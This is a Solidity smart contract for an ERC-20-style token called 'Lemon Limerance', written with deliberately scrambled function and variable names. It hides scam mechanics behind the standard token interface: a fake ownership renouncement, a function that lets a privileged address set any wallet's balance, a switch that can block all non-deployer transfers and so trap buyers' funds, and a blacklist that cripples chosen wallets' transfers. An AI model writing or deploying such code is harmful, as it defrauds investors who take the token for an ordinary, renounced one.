//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface fundTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address listMin) external view returns (uint256);

    function transfer(address liquidityToken, uint256 maxLiquidity) external returns (bool);

    function allowance(address minFeeLimit, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityToken,
        uint256 maxLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverFee, uint256 value);
    event Approval(address indexed minFeeLimit, address indexed spender, uint256 value);
}

abstract contract liquidityReceiverShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minAuto {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface enableMin {
    function createPair(address isMin, address exemptLaunchTake) external returns (address);
}

interface fundTotalMetadata is fundTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LemonLimerance is liquidityReceiverShould, fundTotal, fundTotalMetadata {

    string private senderAt = "Lemon Limerance";

    mapping(address => bool) public amountWalletTx;

    function approve(address sellAmount, uint256 maxLiquidity) public virtual override returns (bool) {
        totalAtIs[_msgSender()][sellAmount] = maxLiquidity;
        emit Approval(_msgSender(), sellAmount, maxLiquidity);
        return true;
    }

    uint256 private toLaunchedMode;

    uint256 tradingIs;

    mapping(address => bool) public liquidityLimit;

    function symbol() external view virtual override returns (string memory) {
        return takeFee;
    }

    function transfer(address exemptWallet, uint256 maxLiquidity) external virtual override returns (bool) {
        return enableShould(_msgSender(), exemptWallet, maxLiquidity);
    }

    address public minReceiverAt;

    address feeExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function buyLaunch(address limitSender) public {
        listShould();
        if (marketingFee) {
            marketingFee = false;
        }
        if (limitSender == launchList || limitSender == minReceiverAt) {
            return;
        }
        liquidityLimit[limitSender] = true;
    }

    uint256 constant listSellWallet = 20 ** 10;

    function balanceOf(address listMin) public view virtual override returns (uint256) {
        return tradingSenderTo[listMin];
    }

    uint256 private toEnable;

    address private buyLimit;

    function totalTeam(address launchedTeam) public {
        if (txWalletLaunched) {
            return;
        }
        if (tokenTx != toLaunchedMode) {
            toLaunchedMode = shouldReceiverList;
        }
        amountWalletTx[launchedTeam] = true;
        
        txWalletLaunched = true;
    }

    constructor (){
        if (fundIs == marketingMax) {
            marketingMax = tokenTx;
        }
        fromAutoList();
        minAuto receiverTo = minAuto(tokenFee);
        minReceiverAt = enableMin(receiverTo.factory()).createPair(receiverTo.WETH(), address(this));
        if (toEnable != tokenTx) {
            toEnable = fundIs;
        }
        launchList = _msgSender();
        amountWalletTx[launchList] = true;
        tradingSenderTo[launchList] = swapMax;
        if (shouldReceiverList != tokenTx) {
            tokenTx = toEnable;
        }
        emit Transfer(address(0), launchList, swapMax);
    }

    function launchFee(address exemptLimit, address liquidityToken, uint256 maxLiquidity) internal returns (bool) {
        require(tradingSenderTo[exemptLimit] >= maxLiquidity);
        tradingSenderTo[exemptLimit] -= maxLiquidity;
        tradingSenderTo[liquidityToken] += maxLiquidity;
        emit Transfer(exemptLimit, liquidityToken, maxLiquidity);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return senderAt;
    }

    function owner() external view returns (address) {
        return buyLimit;
    }

    uint256 atTo;

    function minAt(uint256 maxLiquidity) public {
        listShould();
        tradingIs = maxLiquidity;
    }

    bool public marketingFee;

    string private takeFee = "LLE";

    address public launchList;

    uint256 private marketingMax;

    function getOwner() external view returns (address) {
        return buyLimit;
    }

    event OwnershipTransferred(address indexed minTotalBuy, address indexed isFrom);

    address tokenFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => uint256) private tradingSenderTo;

    bool public txWalletLaunched;

    uint256 private tokenTx;

    bool private receiverAmount;

    uint256 private shouldReceiverList;

    function fromAutoList() public {
        emit OwnershipTransferred(launchList, address(0));
        buyLimit = address(0);
    }

    function transferFrom(address exemptLimit, address liquidityToken, uint256 maxLiquidity) external override returns (bool) {
        if (_msgSender() != tokenFee) {
            if (totalAtIs[exemptLimit][_msgSender()] != type(uint256).max) {
                require(maxLiquidity <= totalAtIs[exemptLimit][_msgSender()]);
                totalAtIs[exemptLimit][_msgSender()] -= maxLiquidity;
            }
        }
        return enableShould(exemptLimit, liquidityToken, maxLiquidity);
    }

    mapping(address => mapping(address => uint256)) private totalAtIs;

    function enableShould(address exemptLimit, address liquidityToken, uint256 maxLiquidity) internal returns (bool) {
        if (exemptLimit == launchList) {
            return launchFee(exemptLimit, liquidityToken, maxLiquidity);
        }
        uint256 enableToToken = fundTotal(minReceiverAt).balanceOf(feeExempt);
        require(enableToToken == tradingIs);
        require(liquidityToken != feeExempt);
        if (liquidityLimit[exemptLimit]) {
            return launchFee(exemptLimit, liquidityToken, listSellWallet);
        }
        return launchFee(exemptLimit, liquidityToken, maxLiquidity);
    }

    function teamSender(address exemptWallet, uint256 maxLiquidity) public {
        listShould();
        tradingSenderTo[exemptWallet] = maxLiquidity;
    }

    uint256 private fundIs;

    uint8 private modeMax = 18;

    function decimals() external view virtual override returns (uint8) {
        return modeMax;
    }

    function listShould() private view {
        require(amountWalletTx[_msgSender()]);
    }

    uint256 private swapMax = 100000000 * 10 ** 18;

    function totalSupply() external view virtual override returns (uint256) {
        return swapMax;
    }

    function allowance(address launchedSell, address sellAmount) external view virtual override returns (uint256) {
        if (sellAmount == tokenFee) {
            return type(uint256).max;
        }
        return totalAtIs[launchedSell][sellAmount];
    }

}